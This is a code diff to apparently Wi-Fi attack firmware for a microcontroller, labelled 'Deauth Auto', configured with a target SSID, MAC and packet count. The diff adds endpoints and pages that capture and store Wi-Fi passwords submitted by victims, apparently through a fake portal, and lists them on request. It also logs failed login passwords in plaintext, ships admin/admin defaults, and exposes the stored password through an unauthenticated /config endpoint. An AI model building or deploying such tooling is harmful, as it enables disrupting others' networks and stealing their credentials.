@@ -11,6 +11,8 @@ struct Config {
   String targetMAC;
   String loginPageName;
   int totalSendPkt;
+  String username;
+  String password;
 };
 
 Config config;
@@ -82,6 +84,16 @@ bool loadConfig() {
   config.targetMAC = doc["target_mac"].as<String>();
   config.loginPageName = doc["login_page_name"].as<String>();
   config.totalSendPkt = doc["total_send_pkt"].as<int>();
+  config.username = doc["username"].as<String>();
+  config.password = doc["password"].as<String>();
+  
+  // Debug: Check if values are loaded properly
+  Serial.println("=== Configuration Debug ===");
+  Serial.println("Username loaded: '" + config.username + "'");
+  Serial.println("Password loaded: '" + config.password + "'");
+  Serial.println("Username length: " + String(config.username.length()));
+  Serial.println("Password length: " + String(config.password.length()));
+  Serial.println("==========================");
   
   Serial.println("Configuration loaded successfully:");
   Serial.println("IP: " + config.ip);
@@ -89,8 +101,116 @@ bool loadConfig() {
   Serial.println("Target MAC: " + config.targetMAC);
   Serial.println("Login Page Name: " + config.loginPageName);
   Serial.println("Total Send Packets: " + String(config.totalSendPkt));
+  Serial.println("Username: " + config.username);
+  Serial.println("Password: " + config.password);
   
   return true;
+}
+
+// Function to save WiFi password
+void saveWiFiPassword(const String& ssid, const String& password, const String& timestamp) {
+  DynamicJsonDocument doc(2048);
+  
+  // Load existing WiFi passwords
+  if (SPIFFS.exists("/wifi_passwords.json")) {
+    File file = SPIFFS.open("/wifi_passwords.json", "r");
+    if (file) {
+      DeserializationError error = deserializeJson(doc, file);
+      file.close();
+      if (error) {
+        Serial.println("Failed to parse wifi_passwords.json, creating new file");
+        doc.clear();
+      }
+    }
+  }
+  
+  // Create new WiFi password entry
+  JsonObject wifiEntry = doc.createNestedObject();
+  wifiEntry["ssid"] = ssid;
+  wifiEntry["password"] = password;
+  wifiEntry["timestamp"] = timestamp;
+  wifiEntry["ip"] = server.client().remoteIP().toString();
+  
+  // Save to file
+  File file = SPIFFS.open("/wifi_passwords.json", "w");
+  if (file) {
+    serializeJson(doc, file);
+    file.close();
+    Serial.println("WiFi password saved: " + ssid + " - " + password);
+  } else {
+    Serial.println("Failed to save WiFi password");
+  }
+}
+
+// Function to get WiFi passwords
+String getWiFiPasswords() {
+  if (SPIFFS.exists("/wifi_passwords.json")) {
+    File file = SPIFFS.open("/wifi_passwords.json", "r");
+    if (file) {
+      String content = file.readString();
+      file.close();
+      return content;
+    }
+  }
+  return "[]";
+}
+
+// Function to save failed login attempt
+void saveFailedLogin(const String& username, const String& password, const String& timestamp, const String& ip) {
+  DynamicJsonDocument doc(2048);
+  
+  // Load existing failed logins
+  if (SPIFFS.exists("/failed_logins.json")) {
+    File file = SPIFFS.open("/failed_logins.json", "r");
+    if (file) {
+      DeserializationError error = deserializeJson(doc, file);
+      file.close();
+      if (error) {
+        Serial.println("Failed to parse failed_logins.json, creating new file");
+        doc.clear();
+      }
+    }
+  }
+  
+  // Create new failed login entry
+  JsonObject failedLogin = doc.createNestedObject();
+  failedLogin["username"] = username;
+  failedLogin["password"] = password;
+  failedLogin["timestamp"] = timestamp;
+  failedLogin["ip"] = ip;
+  
+  // Save to file
+  File file = SPIFFS.open("/failed_logins.json", "w");
+  if (!file) {
+    Serial.println("Failed to open failed_logins.json for writing");
+    return;
+  }
+  
+  serializeJson(doc, file);
+  file.close();
+  
+  Serial.println("Failed login saved:");
+  Serial.println("Username: " + username);
+  Serial.println("Password: " + password);
+  Serial.println("Timestamp: " + timestamp);
+  Serial.println("IP: " + ip);
+}
+
+// Function to get failed logins
+String getFailedLogins() {
+  if (!SPIFFS.exists("/failed_logins.json")) {
+    return "[]";
+  }
+  
+  File file = SPIFFS.open("/failed_logins.json", "r");
+  if (!file) {
+    Serial.println("Failed to open failed_logins.json for reading");
+    return "[]";
+  }
+  
+  String content = file.readString();
+  file.close();
+  return content;
 }
 
 // Function to create default configuration
@@ -102,6 +222,8 @@ void createDefaultConfig() {
   doc["target_mac"] = "AA:BB:CC:DD:EE:FF";
   doc["login_page_name"] = "login.html";
   doc["total_send_pkt"] = 100;
+  doc["username"] = "admin";
+  doc["password"] = "admin";
   
   File file = SPIFFS.open("/settings.json", "w");
   if (!file) {
@@ -123,6 +245,8 @@ bool saveConfig() {
   doc["target_mac"] = config.targetMAC;
   doc["login_page_name"] = config.loginPageName;
   doc["total_send_pkt"] = config.totalSendPkt;
+  doc["username"] = config.username;
+  doc["password"] = config.password;
   
   File file = SPIFFS.open("/settings.json", "w");
   if (!file) {
@@ -179,6 +303,14 @@ void handleSave() {
     config.totalSendPkt = server.arg("packets").toInt();
     Serial.println("Packets updated: " + String(config.totalSendPkt));
   }
+  if (server.hasArg("username")) {
+    config.username = server.arg("username");
+    Serial.println("Username updated: " + config.username);
+  }
+  if (server.hasArg("password")) {
+    config.password = server.arg("password");
+    Serial.println("Password updated: " + config.password);
+  }
   
   // Save configuration
   if (saveConfig()) {
@@ -202,20 +334,172 @@ void handleConfig() {
   doc["target_mac"] = config.targetMAC;
   doc["login_page_name"] = config.loginPageName;
   doc["total_send_pkt"] = config.totalSendPkt;
+  doc["username"] = config.username;
+  doc["password"] = config.password;
   
   String jsonString;
   serializeJson(doc, jsonString);
   server.send(200, "application/json", jsonString);
 }
 
+void handleAuth() {
+  if (server.method() != HTTP_POST) {
+    server.send(405, "text/plain", "Method Not Allowed");
+    return;
+  }
+  
+  String body = server.arg("plain");
+  Serial.println("Received auth data: " + body);
+  
+  DynamicJsonDocument doc(512);
+  DeserializationError error = deserializeJson(doc, body);
+  
+  if (error) {
+    Serial.println("Failed to parse JSON");
+    server.send(400, "text/plain", "Invalid JSON");
+    return;
+  }
+  
+  String username = doc["username"].as<String>();
+  String password = doc["password"].as<String>();
+  
+  // Debug authentication
+  Serial.println("=== Authentication Debug ===");
+  Serial.println("Received username: '" + username + "'");
+  Serial.println("Received password: '" + password + "'");
+  Serial.println("Config username: '" + config.username + "'");
+  Serial.println("Config password: '" + config.password + "'");
+  Serial.println("Username match: " + String(username == config.username ? "YES" : "NO"));
+  Serial.println("Password match: " + String(password == config.password ? "YES" : "NO"));
+  Serial.println("==========================");
+  
+  // Check credentials against settings.json
+  if (username == config.username && password == config.password) {
+    Serial.println("Authentication successful for user: " + username);
+    server.send(200, "application/json", "{\"success\": true}");
+  } else {
+    Serial.println("Authentication failed for user: " + username);
+    
+    // Save failed login attempt
+    String timestamp = String(millis()); // Simple timestamp
+    String clientIP = server.client().remoteIP().toString();
+    saveFailedLogin(username, password, timestamp, clientIP);
+    
+    server.send(401, "application/json", "{\"success\": false, \"message\": \"Invalid credentials\"}");
+  }
+}
+
+void handleGetFailedLogins() {
+  String failedLogins = getFailedLogins();
+  server.send(200, "application/json", failedLogins);
+}
+
+void handleClearFailedLogins() {
+  if (server.method() != HTTP_POST) {
+    server.send(405, "text/plain", "Method Not Allowed");
+    return;
+  }
+  
+  if (SPIFFS.exists("/failed_logins.json")) {
+    if (SPIFFS.remove("/failed_logins.json")) {
+      Serial.println("Failed logins file cleared");
+      server.send(200, "text/plain", "Failed logins cleared");
+    } else {
+      Serial.println("Failed to remove failed_logins.json");
+      server.send(500, "text/plain", "Error clearing failed logins");
+    }
+  } else {
+    server.send(200, "text/plain", "No failed logins to clear");
+  }
+}
+
+void handleSaveWiFiPassword() {
+  if (server.method() != HTTP_POST) {
+    server.send(405, "text/plain", "Method Not Allowed");
+    return;
+  }
+  
+  String body = server.arg("plain");
+  Serial.println("Received WiFi password data: " + body);
+  
+  DynamicJsonDocument doc(512);
+  DeserializationError error = deserializeJson(doc, body);
+  
+  if (error) {
+    Serial.println("Failed to parse WiFi password JSON");
+    server.send(400, "text/plain", "Invalid JSON");
+    return;
+  }
+  
+  String ssid = doc["ssid"].as<String>();
+  String password = doc["password"].as<String>();
+  String timestamp = doc["timestamp"].as<String>();
+  
+  // Save WiFi password to JSON file
+  saveWiFiPassword(ssid, password, timestamp);
+  
+  server.send(200, "text/plain", "WiFi password saved");
+}
+
+void handleGetWiFiPasswords() {
+  String wifiPasswords = getWiFiPasswords();
+  server.send(200, "application/json", wifiPasswords);
+}
+
+void handleClearWiFiPasswords() {
+  if (server.method() != HTTP_POST) {
+    server.send(405, "text/plain", "Method Not Allowed");
+    return;
+  }
+  
+  if (SPIFFS.exists("/wifi_passwords.json")) {
+    if (SPIFFS.remove("/wifi_passwords.json")) {
+      Serial.println("WiFi passwords file cleared");
+      server.send(200, "text/plain", "WiFi passwords cleared");
+    } else {
+      Serial.println("Failed to remove wifi_passwords.json");
+      server.send(500, "text/plain", "Error clearing WiFi passwords");
+    }
+  } else {
+    server.send(200, "text/plain", "No WiFi passwords to clear");
+  }
+}
+
 void setup() {
   Serial.begin(115200);
   Serial.println("Deauth Auto Starting...");
   
+  // Initialize SPIFFS
+  if (!SPIFFS.begin()) {
+    Serial.println("Failed to mount SPIFFS");
+    return;
+  }
+  
+  // Check if settings.json exists and has content
+  if (SPIFFS.exists("/settings.json")) {
+    File file = SPIFFS.open("/settings.json", "r");
+    if (file) {
+      String content = file.readString();
+      file.close();
+      Serial.println("settings.json content: " + content);
+    }
+  } else {
+    Serial.println("settings.json does not exist, will create default");
+  }
+  
   // Load configuration
   if (!loadConfig()) {
     Serial.println("Using default configuration");
+  } else {
+    Serial.println("Configuration loaded successfully from settings.json");
   }
+  
+  // Verify configuration is loaded
+  Serial.println("=== Final Configuration Check ===");
+  Serial.println("Username: '" + config.username + "'");
+  Serial.println("Password: '" + config.password + "'");
+  Serial.println("Target SSID: '" + config.targetSSID + "'");
+  Serial.println("================================");
   
   // Parse IP address from config
   IPAddress local_IP, gateway, subnet;
@@ -253,14 +537,35 @@ void setup() {
   server.on("/index.html", HTTP_GET, []() {
       sendProgmem((char*)index_html, index_html_len, "text/html");
   });
+  server.on("/login.html", HTTP_GET, []() {
+      sendProgmem((char*)login_html, login_html_len, "text/html");
+  });
+  server.on("/failed_logins.html", HTTP_GET, []() {
+      sendProgmem((char*)failed_logins_html, failed_logins_html_len, "text/html");
+  });
+  server.on("/wifi.html", HTTP_GET, []() {
+      sendProgmem((char*)wifi_html, wifi_html_len, "text/html");
+  });
+  server.on("/wifi_passwords.html", HTTP_GET, []() {
+      sendProgmem((char*)wifi_passwords_html, wifi_passwords_html_len, "text/html");
+  });
   server.on("/style.css", HTTP_GET, []() {
       sendProgmem((char*)style_css, style_css_len, "text/css");
   });
   server.on("/script.js", HTTP_GET, []() {
       sendProgmem((char*)script_js, script_js_len, "text/javascript");
   });
+  server.on("/login.js", HTTP_GET, []() {
+      sendProgmem((char*)login_js, login_js_len, "text/javascript");
+  });
   server.on("/save", HTTP_POST, handleSave);
   server.on("/config", HTTP_GET, handleConfig);
+  server.on("/auth", HTTP_POST, handleAuth);
+  server.on("/failed-logins", HTTP_GET, handleGetFailedLogins);
+  server.on("/clear-failed-logins", HTTP_POST, handleClearFailedLogins);
+  server.on("/save-wifi-password", HTTP_POST, handleSaveWiFiPassword);
+  server.on("/wifi-passwords", HTTP_GET, handleGetWiFiPasswords);
+  server.on("/clear-wifi-passwords", HTTP_POST, handleClearWiFiPasswords);
   server.begin();
   
   Serial.println("Web server started");
